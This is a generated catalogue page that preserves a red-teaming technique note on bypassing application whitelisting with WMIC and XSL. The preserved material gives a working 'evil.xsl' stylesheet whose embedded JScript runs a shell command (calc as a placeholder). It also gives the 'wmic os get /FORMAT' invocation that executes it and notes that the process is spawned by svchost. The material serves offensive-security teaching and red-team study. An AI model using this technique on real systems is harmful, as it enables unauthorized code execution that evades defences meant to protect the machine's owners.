---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Application Whitelisting Bypass with WMIC and XSL

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-application-whitelisting-bypass-with-wmic-and-xsl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Application Whitelisting Bypass with WMIC and XSL](../../topics/offensive-security/application-whitelisting-bypass-with-wmic-and-xsl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-application-whitelisting-bypass-with-wmic-and-xsl |
| name | Application Whitelisting Bypass with WMIC and XSL |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-04-10 21-57-52.png
- Screenshot from 2019-04-10 22-05-24.png
_body: "# Application Whitelisting Bypass with WMIC and XSL\n\nAnother application whitelist bypassing technique discovered\
  \ by Casey @subTee, similar to squiblydoo:\n\n{% content-ref url=\"t1117-regsvr32-aka-squiblydoo.md\" %}\n[t1117-regsvr32-aka-squiblydoo.md](t1117-regsvr32-aka-squiblydoo.md)\n\
  {% endcontent-ref %}\n\n## Execution\n\nDefine the XSL file containing the jscript payload:\n\n{% code title=\"evil.xsl\"\
  \ %}\n```csharp\n<?xml version='1.0'?>\n<stylesheet\nxmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\
  \nxmlns:user=\"placeholder\"\nversion=\"1.0\">\n<output method=\"text\"/>\n\t<ms:script implements-prefix=\"user\" language=\"\
  JScript\">\n\t<![CDATA[\n\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"calc\");\n\t]]> </ms:script>\n</stylesheet>\n\
  ```\n{% endcode %}\n\nInvoke any wmic command now and specify /format pointing to the evil.xsl:\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\nwmic os get /FORMAT:\"evil.xsl\"\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-10\
  \ 22-05-24.png>)\n\n## Observation\n\nCalculator is spawned by svchost.exe:\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2019-04-10 21-57-52.png>)\n\n## References\n\n{% embed url=\"http://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html\"\
  \ %}"
_relative_path: offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md
````
